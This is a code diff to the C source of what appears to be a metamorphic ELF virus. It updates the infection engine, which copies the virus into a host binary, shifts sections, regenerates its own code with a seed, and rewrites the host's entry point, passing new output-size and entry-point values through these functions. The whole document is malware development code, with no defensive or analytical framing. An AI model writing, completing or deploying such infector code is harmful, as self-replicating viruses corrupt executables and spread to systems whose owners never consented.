@@ -38,7 +38,8 @@ static bool	not_infected(const struct entry *original_entry, \
 	return true;
 }
 
-static bool	change_entry(struct safe_ptr ref, const struct entry *original_entry)
+static bool	change_entry(struct safe_ptr ref, const struct entry *original_entry, \
+			size_t entry_point)
 {
 	Elf64_Ehdr	*clone_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));
 
@@ -69,7 +70,8 @@ static bool	adjust_sizes(struct entry *clone_entry, size_t shift_amount)
 	return true;
 }
 
-static bool	define_shift_amount(const struct entry *original_entry, size_t *shift_amount)
+static bool	define_shift_amount(const struct entry *original_entry,
+			size_t *shift_amount, size_t output_size)
 {
 	const size_t	p_filesz        = original_entry->safe_phdr->p_filesz;
 	const size_t	p_offset        = original_entry->safe_phdr->p_offset;
@@ -101,21 +103,22 @@ bool		infection_engine(struct safe_ptr clone_ref, struct safe_ptr original_ref)
 	struct entry	original_entry;
 	struct entry	clone_entry;
 	size_t		shift_amount;
+	size_t		output_size;
+	size_t		entry_point;
 	uint64_t	seed;
-	// size_t		virus_size; // TODO!!
 
 	if (!find_entry(&mut original_entry, original_ref)
 	|| !not_infected(&original_entry, original_ref)
 	|| !copy_virus_to_clone(clone_ref, &original_entry)
 	|| !generate_seed(&mut seed, clone_ref, original_entry.end_of_last_section)
-	|| !metamorph_self(clone_ref, original_entry.end_of_last_section, seed)//TODO virus_size
-	|| !define_shift_amount(&original_entry, &mut shift_amount)// TODO virus_size
+	|| !metamorph_self(clone_ref, &output_size, &entry_point, original_entry.end_of_last_section, seed)
+	|| !define_shift_amount(&original_entry, &mut shift_amount, output_size)
 	|| !copy_client_to_clone(clone_ref, original_ref, original_entry.end_of_last_section, shift_amount, original_ref.size)
 	|| !adjust_references(clone_ref, shift_amount, original_entry.end_of_last_section)
 	|| !find_entry(&mut clone_entry, clone_ref)
 	|| !adjust_sizes(&mut clone_entry, shift_amount)
 	|| !setup_virus_header(clone_ref, original_entry.end_of_last_section, seed)
-	|| !change_entry(clone_ref, &original_entry))
+	|| !change_entry(clone_ref, &original_entry, entry_point))
 		return errors(ERR_THROW, _ERR_INFECTION_ENGINE);
 
 	return true;
